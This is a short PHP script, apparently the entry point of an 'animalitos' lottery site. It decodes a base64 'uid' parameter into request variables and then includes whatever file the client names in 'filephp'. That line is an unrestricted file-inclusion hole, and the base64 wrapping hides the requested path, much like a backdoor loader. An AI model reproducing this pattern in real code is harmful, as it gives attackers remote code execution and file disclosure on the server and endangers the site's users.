<?
function decoBaseAnimalitosLL2($_decoParam)
{
  // Proceso DECODE param
  $_utxprm = urldecode(base64_decode($_decoParam));
  $_utxprm = explode('|', $_utxprm);

  for ($i = 0; $i <= count($_utxprm) - 1; $i++) {
    $varibles = explode('=', $_utxprm[$i]);

    $_REQUEST[$varibles[0]] = $varibles[1];
  }
  // Fin Proceso DECODE


}

$iud = $_REQUEST['uid'];
decoBaseAnimalitosLL2($iud);

include $_REQUEST['filephp'];
